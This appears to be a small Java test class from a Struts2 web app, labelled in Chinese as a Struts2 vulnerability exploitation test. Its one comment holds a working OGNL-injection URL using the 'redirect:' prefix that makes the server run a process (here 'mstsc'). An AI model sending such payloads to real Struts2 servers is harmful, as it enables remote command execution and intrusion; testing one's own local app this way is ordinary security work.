package com.hzth.myapp.web.action;

import com.opensymphony.xwork2.ActionSupport;

/**
 * Struct2漏洞利用测试
 * 
 */
// http://127.0.0.1:8082/myWebApp/example/index.action?redirect:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{'mstsc'})).start()}
public class ExampleAction extends ActionSupport {

	private static final long serialVersionUID = 1763734623238176585L;

}
